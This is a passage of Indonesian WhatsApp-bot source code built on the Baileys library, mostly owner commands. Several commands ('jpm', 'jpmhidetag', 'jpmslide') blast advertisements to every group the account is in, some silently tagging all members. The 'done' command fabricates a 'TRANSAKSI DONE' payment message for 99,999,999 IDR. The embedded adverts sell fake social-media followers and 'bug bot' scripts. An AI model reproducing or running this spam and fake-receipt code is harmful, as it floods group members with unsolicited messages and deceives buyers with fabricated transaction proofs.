thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await anggazyy.groupLeave(`${gcall[leav].id}`)
}}
break
case "rst": case "restartbot": {
if (!isOwner) return reply(msg.owner)
await reply("Memproses Restart Bot . . .")
execSync("npm restart")
}
break
case "devilsc": { 
if (isOwner) {
reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `Devil Version 4.0 Gen 1 Premium Script`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await anggazyy.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script ${namabot}*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*

*➡️ Youtube :*
${global.linkyt}

*➡️ Grup Jualan :*
${global.linkgc}

*➡️ Testimoni :*
${global.linksaluran}`
anggazyy.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 1000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "done": {
if (isGroup) return reply(msg.private)
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("Panel Unlimited"))
let caption = `\n📦 ${text}\n⏰ ${tanggal(Date.now())}`
const referenceId = `${crypto.randomBytes(11).toString('hex').toUpperCase().slice(0, 11)}`
let ngentod = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
}),
header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
image: await fs.readFileSync("./media/menu.jpg")}, {upload: anggazyy.waUploadToServer})), 
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "review_and_pay",
"buttonParamsJson": `{
"currency": "IDR",
"payment_configuration": "",
"payment_type": "",
"total_amount": {
"value": 99999999,
"offset": 100
},
"reference_id": "${referenceId}",
"type": "physical-goods",
"order": {
"status": "payment_requested",
"description": "Terimakasih",
"subtotal": {
"value": 99999999,
"offset": 100
},
"tax": {
"value": 0,
"offset": 100
}, 
"discount": {
"value": 0,
"offset": 100
},
"order_type": "ORDER",
"items": [{
"retailer_id": "7537631592926009",
"product_id": "7538731592926009",
"name": "TRANSAKSI DONE ✅",
"amount": {
"value": 99999999,
"offset": 1000
},
"quantity": "100"
}]}, 
"additional_note": "${caption}",
"native_payment_methods": []}`
}]}),
contextInfo: {
stanzaId: m.key.id,
remoteJid: isGroup ? m.sender : m.key.remoteJid,
participant: m.key.participant || m.sender,
fromMe: m.key.fromMe,
}}),
}}}, {userJid: m.sender, quoted: m})

await anggazyy.relayMessage(ngentod.key.remoteJid, ngentod.message, {
messageId: ngentod.key.id})
}
break
case "startjpm": {
if (!isOwner) return reply(msg.owner)
var teksnya = await fs.readFileSync("./list/teksjpm.js").toString()
if (teksnya.length < 1) return reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Ke Teks *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Marketplace\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(4000)
}
reply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
}
break
case "jpmhidetag": case "jpmht": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Hidetag Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
var ments = []
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: ments, 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})}
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Hidetag Teks Ke *${total} Grup*`)
}
break
case "jpmhidetag2": case "jpmht2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return reply(example("teksnya dengan balas/kirim foto"))
let image = await anggazyy.downloadAndSaveMediaMessage(qmsg)
var teks = text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Hidetag Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
var ments = []
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: ments, 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Hidetag Teks & Foto Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Teks Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
reply(`Berhasil Mengirim Pesan Teks Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return reply(example("teksnya dengan balas/kirim foto"))
let image = await anggazyy.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
await reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: anggazyy.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: qtoko})
for (let jid of usergc) {
try {
await anggazyy.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
reply(`Berhasil Mengirim Pesan Teks & Foto Ke *${total} Grup*`)
}
break
case "jpmslide": case "startjpmslide": {
if (!isOwner) return reply(msg.owner)
let total = 0
let getGroups = await anggazyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
const Obj = [`\n*List Harga Panel Pterodactyl⚡*

* *Ram 1GB & Cpu 40%*
Harga : Rp2000
* *Ram 2GB & Cpu 50%*
Harga : Rp3000
* *Ram 3GB & Cpu 60%*
Harga : Rp4000
* *Ram 4GB & Cpu 80%*
Harga : Rp5000
* *Ram 5GB & Cpu 110%*
Harga : Rp6000
* *Ram & Cpu Unlimited*
Harga : Rp6000

Gratis *Script Bot Pushkontak & Jpm* Setiap Pembelian Di Atas Ram 5GB`, 
`\n*List Jasa Script Bot By anggazyy 📦*

* Jasa *Rename* Sc Bot
* Jasa *Fix SC Error*
* Jasa Ubah *Fitur Bot*
* Jasa *Fix Fitur* Error
* Jasa *Edit / Tambah* Fitur
* Jasa Ubah *SC Scan* Ke *Pairing Code*
* Dan Lain² Langsung PM Aja

*Untuk Harga Cuma 5k - 15k, Tergantung Kesulitan Codenya!*`, 
`\n*List Produk anggazyy- Official 🛒*

* Nokos Whatsapp (+62) Rp8k
* Nokos Whatsapp (+84) Rp6,5k
* Nokos Whatsapp (+998) Rp7k
* Domain *(my.id/biz.id)*
* Subdomain *(4 Subdo Rp2k)*
* SC Tema Panel Pterodactyl
* SC *anggazyybotz Terbaru* No Enc
* SC Bot Subdomain 60 Api
* SC Cpanel *(Untuk Open Resseller)*
* SC Bot Bug Terbaru
* Jasa Instal Panel *(Free Subdo)*
* Jasa Fix Error Node Panel
* DLL Tanyakan Saja!`, 
`\n*List Harga Suntik Sosmed 🛒*

*Layanan Instagram*
* 1000 Followers Rp10.000
* 1000 Like Rp5500
* 1000 Like Reels Rp10.000
* 1000 Views Reels Rp7000

*Layanan Facebook*
* 1000 Followers Rp8000
* 1000 Like Rp10.000
* 1000 Share Rp8000

*Layanan Tiktok*
* 500 Followers Rp10.000
* 1000 Like Rp8000
* 10.000 Views Rp2000

*Note :* Semua Proses Pengerjaan Tidak Mermerlukan Email/Password Akun, Di Jamin Aman 100%`]
await reply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await SendSlide(jid, fs.readFileSync("./media/anggazyy.jpg"), Obj)
total += 1
} catch {}
await sleep(global.delayjpm)
}
await reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break
case "addadmin": {
if (!text) return reply(example("username"))
if (!isOwner) return reply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addadmin2": {
if (!text) return reply(example("nama,6283XXX"))
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("ID Admin Tidak Ditemukan!")
reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
anggazyy.sendText(m.chat, teks, qtoko)
}
break
case "cpanel": case "addpanel": case "buatpanel": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama"))
global.panel = [text.toLowerCase()]
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg")}, { upload: anggazyy.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv4\"}"
                  }
                ]
              })
